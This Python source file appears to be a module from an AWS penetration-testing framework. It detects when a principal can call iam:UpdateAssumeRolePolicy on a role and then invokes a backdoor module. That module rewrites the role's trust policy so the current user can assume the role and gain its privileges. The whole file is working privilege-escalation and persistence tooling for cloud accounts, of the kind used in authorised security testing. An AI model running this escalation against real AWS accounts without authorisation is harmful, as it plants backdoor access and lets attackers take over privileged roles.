from typing import Optional

from modules.iam__pivot_v2.common import Escalation

from principalmapper.querying.query_interface import local_check_authorization_handling_mfa as local_check_auth_mfa, \
    Node
from .iam_checker import IamEscalationChecker


def ChangeRoleTrustDoc(pacu_main, print, input, fetch_data, target: Node, source: Node):
    print('  Starting method UpdateRolePolicyToAssumeIt...\n')
    print('Targeting role {}. Trying to backdoor access to it from the current user...'.format(target.arn))

    if fetch_data(['Backdooring Roles'], 'iam__backdoor_assume_role', '--role-names {}'.format(target.arn), force=True):
        print('Successfully updated the assume-role-policy-document for role {}. You should now be able to assume '
              'that role to gain its privileges.\n'.format(target.arn))
        return True
    else:
        print('iam__backdoor_assume_role module failed. Exiting...')
        return False


@IamEscalationChecker.register_role_escalation
def change_role_trust_doc(source: Node, dest: Node) -> Optional[Escalation]:
    # Change the role's trust doc
    update_role_res, mfa_res = local_check_auth_mfa(source, 'iam:UpdateAssumeRolePolicy', dest.arn, {})
    if update_role_res:
        reason = 'can update the trust document to access'
        if mfa_res:
            reason = '(MFA required) ' + reason

        return Escalation(source, dest, escalate_func=ChangeRoleTrustDoc, reason=reason)
    else:
        return None
